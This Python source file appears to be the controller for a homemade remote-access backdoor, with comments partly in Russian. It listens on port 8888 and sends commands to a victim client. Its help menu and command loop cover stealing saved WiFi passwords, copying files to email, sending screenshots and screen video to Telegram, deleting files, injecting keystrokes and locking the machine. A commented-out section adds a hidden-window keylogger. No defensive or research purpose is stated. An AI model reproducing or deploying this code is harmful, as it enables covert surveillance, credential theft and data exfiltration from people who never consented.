try:
    from os import system
    """system("pip install subprocess")
    system("pip install easyocr")
    system("pip install sockets")
    system("pip install opencv-python")
    system("pip install pypi-stat")
    system("pip install comtypes")"""
    # Добавляем необходимые подклассы - MIME-типы
    import subprocess
    import os.path
    import socket
    import stat
    import os, time

    global cd
    cd = False


    def waiting(s, client):
        client.close()
        s.close()
        print("Ждём..")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", 8888))
        s.listen(5)
        client, addr = s.accept()
        time.sleep(10)


    def ch_dir(dir):
        command = "ch_dir " + dir
        client.send(command.encode("cp866"))
        subprocess.getoutput("dir")


    def py_to_exe(filename):
        client.send(("py_to_exe:" + filename).encode("cp65001"))
        print(client.recv(1024 * 1024 * 1024).decode("utf-8"))


    """
    def def_hide():
        class myThread(threading.Thread):
            def __init__(self, threadID, name, counter):
                threading.Thread.__init__(self)
                self.threadID = threadID
                self.name = name
                self.counter = counter
    
            def run(self):
                main()
        
        def hide():
            import win32console, win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
            return True
        
        # Запуск кейлогера
        def main():
            hm.KeyDown = OnKeyboardEvent
            hm.HookKeyboard()
            pythoncom.PumpMessages()
        
        hide()
        hm = pyHook.HookManager()
        disallow_Multiple_Instances()
        thread = myThread(1, "Thread", 1)
        thread.start()
    """



    def read_file(command):
        client.send((command.encode("utf-8")))


    def hlp():
        print(r"""
    ┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
    │                                   /\ ─ ├ │ └ ┐ ┘ ┌ /\                                                  │
    │                //┌───────────────────────────────────────────────────┐\\                               │
    │                //│Util for backdoor to the computer by ip in one wifi│\\                               │
    │                //└───────────────────────────────────────────────────┘\\                               │
    │                                   \/ ─ ├ │ └ ┐ ┘ ┌ \/                                                  │
    │                //for ├─ commands ypu can use >> to write the log into file.                            │
    │                //Example: show_wifi_pass >>                                                            │
    │                //Result: show_wifi_pass.txt                                                            │
    │cd [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY                                                      │
    │ch_dir [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY                                                  │
    │cp_dir [-D] - COPY DIRECTORY TO THE EMAIL: -D - DIRECTORY                                               │
    │cpy_mail [-F] - COPY FILE TO THE EMAIL (AUDIO, TEXT, VIDEO): -F - FILE                                  │
    │cpy [-F] - COPY FILE TO THE SERVER'S COMPUTER: -F - FILE                                                │
    │hlp - SHOW THIS WINDOW                                                                                  │
    │send_video [-T] - SEND VIDEO TO THE TELEGRAM: -T - TIME (IN SECONDS)                                    │
    │send_file [-F] - SEND FILE TO THE CLIENT: -F - FILE                                                     │
    │edit [-F] - EDIT TEXT FILE IN NOTEPAD: -F - FILE                                                        │
    │py_to_exe: [-F] - CONVERT PY FILE TO EXE FILE AND SAVE IN THE DIRECTORY WITH NAME OF THE FILE: -F - FILE│
    ├─read [-F] - READ TEXT FILE OR SHOW ALL FILES AND DIRECTORIES IN DIRECTORY: -F - FILE OR DIRECTORY      │
    │delete [-N] - DELETE FILE FROM THE DIRECTORY OR DIRECTORY: -N - NAME                                    │
    │screenshot - SEND THE SCREENSHOT TO THE EMAIL                                                           │
    │make_d [-N] - MAKING DIRECTORY WITH NAME: -N - NAME                                                     │
    ├─show_geo - SHOWS GLOBAL, LOCAL IP, GEOLOCATION                                                         │
    ├─show_wifi_pass - SHOW SAVED WIFI PASSWORDS                                                             │
    │//check_wifi - SHOWS RESULT OF {ARP -A} COMMAND - (useless)                                             │
    │abbort_client [-N] - KILL THE CONNECTION WITH CLIENT: -N - NUMBER OF A CLIENT                           │
    ├─find_file [-N] - FIND FILE OR DIRECTORY: -N - NAME                                                     │    
    │<beta!:>                                                                                                │
    │    {                                                                                                   │
    │        (don't open window)                                                                             │
    │            lock [-P] - LOCKS A COMPUTER: -P - PASWORD                                                  │
    │        (don't work as it should)                                                                       │
    │            abbort - KILL THE SERVER                                                                    │
    │    }                                                                                                   │
    │</beta!:>                                                                                               │
    │//def_hide - default alg to hide client program                                                         │
    │//send_v1deo - default alg to send screen video if computers are not connected (in 2 times faster)      │
    │rasp_scr [-I] [-T] - SEARCHING SPECIAL STRING IN IMAGE: -I - IMAGE (DEFAULT NONE), -T TEXT              │
    │kboard# [-C] - WORK WITH KEYBOARD: -C - COMMAND                                                         │
    │    1. writeing [-T] - WRITEING TEXT TO THE COMP: -T - TEXT                                             │
    │    2. hotk [-K] [-T] - ADD HOTKEY TO WRITE TEXT: -K - KEY, -T - TEXT                                   │
    └────────────────────────────────────────────────────────────────────────────────────────────────────────┘
        """)


    def dub_edit():
        or_co1 = ""
        or_co = ""
        print("Input a code by a line:")
        while or_co1 != "abberation":
            or_co1 = input(">> ")
            if or_co1 != "abberation":
                or_co += or_co1
        return or_co


    def edit(command):
        client.send(command.encode("cp65001"))


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_ip = str(socket.gethostbyname(socket.gethostname()))
    print(local_ip)
    s.bind(("0.0.0.0", 8888))
    s.listen(5)
    client, addr = s.accept()
    command = ""
    #keys = []
    ch_dir_ch = False
    cur_dir = client.recv(1024).decode("cp65001")
    print("Type hlp to see list of commands")
    client.send(local_ip.encode("cp65001"))
    while True:
        try:
            command = input(cur_dir + ">> ")
            if "send_video" == command.split(" ")[0]:
                client.send((command.encode("cp65001")))
                time.sleep(int(command.split(" ")[-1]))
            elif "cpy_mail" == command.split(" ")[0]:
                client.send(command.encode("utf-8"))
            elif "show_wifi_pass" == command.split(" ")[0]:
                client.send(command.encode("utf-8"))
                guts = client.recv(4096).decode("utf-8")
                print(guts)
                if len(command.split(" ")) == 2:
                    f = open(command.split(' ')[0] + ".txt", "w", encoding="utf-8")
                    f.write(guts)
                    f.close()
            elif "send_file" == command.split(" ")[0]:
                f = open(command.split(" ")[-1], "r", encoding='utf-8')
                client.send((command).encode("utf-8"))
                client.send((f.read()).encode("utf-8"))
                f.close()
            elif "cpy" == command.split(" ")[0]:
                read_file(command)
                result_output = client.recv(4096 * 1024).decode("utf-8")
                name = (command.split(" ")[-1]).split(".")[0] + "_cpied." + (command.split(" ")[-1]).split(".")[-1]
                f = open(name, "w", encoding="utf-8")
                f.write(result_output)
                f.close()
                print("\nDestination of copied file is " + os.path.abspath(name) + "\n")
            elif "screenshot" == command:
                client.send(command.encode("cp65001"))
            elif "lock" == command:
                client.send(command.encode("cp65001"))
            elif "py_to_exe" == command.split(":")[0]:
                fi = (command.split(":"))[-1]
                py_to_exe(fi)
            elif "read" == command.split(" ")[0]:
                read_file(command)
                result_output = client.recv(4096 * 1024).decode("utf-8")
                print(result_output)
                cr = command.split(" ")
                if cr[-1] == ">>":
                    cr[1] = cr[1].replace(".", "^")
                    nm = cr[0] + "_" + cr[1] + ".txt"
                    f = open(nm, "w", encoding="utf-8")
                    f.write(result_output)
                    f.close()
            elif "check_wifi" == command:
                client.send(command.encode("cp65001"))
                print(client.recv(4096).decode("utf-8"))
            elif "cd" == command.split(" ")[0]:
                if not ch_dir_ch:
                    #i = input("Did you mean 'ch_dir'? (Y/N)").lower()
                    i = "y"
                    if i == "y":
                        ch_dir((command.split(" "))[-1])
                        cur_dir = client.recv(1024).decode("cp65001")
                        #u = input("Do you want to change 'cd' command to 'ch_dir' automaticaly? (Y/N)").lower()
                        u = "y"
                        if u == "y":
                            ch_dir_ch = True
                            continue
                        else:
                            ch_dir_ch = False
                    else:
                        print("Unavailable command.")
                        pass
                if ch_dir_ch:
                    if "cd" in command:
                        command = "ch_dir " + (command.split(" "))[-1]
                        ch_dir((command.split(" "))[-1])
                        cur_dir = client.recv(1024).decode("cp65001")
            elif "ch_dir" == command.split(" ")[0]:
                ch_dir((command.split(" "))[-1])
                cur_dir = client.recv(1024).decode("cp65001")
            elif "delete" == command.split(" ")[0]:
                client.send((command.encode("cp65001")))
            elif command == "hlp":
                hlp()
                continue
            elif "make_d" == command.split(" ")[0]:
                client.send((command.encode("cp65001")))
                cur_dir = client.recv(1024).decode("cp65001")
            elif "show_geo" == command:
                client.send((command.encode("cp65001")))
                guts = (client.recv(4096).decode("cp65001"))
                print(guts)
                if len(command.split(" ")) == 2:
                    f = open(command.split(" ")[0] + ".txt", "w", encoding="utf-8")
                    f.write(guts)
                    f.close()
            elif "edit" == command.split(" ")[0]:
                edit(command)
                original_code = client.recv(1024).decode("utf-8")
                print(original_code)
                with open("temp.txt", "w") as file:
                    file.write(original_code)
                    file.close()
                os.system("start temp.txt")
                ready = input("Are you ready? ")

                file = open("temp.txt", "r")
                p = file.read()
                #print(client.recv(1024).decode("cp65001"))
                client.send(p.encode("utf-8"))
                print(client.recv(1024).decode("utf-8"))
                file.close()
                os.chmod(os.path.abspath("temp.txt"), stat.S_IWRITE)
                os.system("del temp.txt")
            elif "find_file" == command.split(" ")[0]:
                client.send((command).encode("cp65001"))
                guts = client.recv(1024).decode("utf-8")
                print(guts)
                if ">>" in command.split(" "):
                    f = open(((command.replace(" ", "_")).replace(".", "^")).replace(">", "") + ".txt", "w", encoding="utf-8")
                    f.write(guts)
                    f.close()
            elif "kboard" == command.split("#")[0]:
                client.send(command.encode("cp65001"))
            elif "abbort_client" == command.split(" ")[0]:
                client.send(command.split(" ")[0].encode("cp65001"))
            elif "abbort" == command:
                exit(1)
            elif "cd" not in command and command != "":
                client.send(command.encode("cp65001"))
                result_output = client.recv(4096).decode("cp65001").split("╨Т┬а")
                print(" ".join(result_output))
        except ConnectionResetError and ConnectionAbortedError:
            if "abbort" == command:
                exit(1)
            client.close()
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", 8888))
            s.listen(5)
            client, addr = s.accept()
        except:
            client.close()
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", 8888))
            s.listen(5)
            client, addr = s.accept()
    client.close()
    s.close()
except Exception as e:
    print(e)
    input()
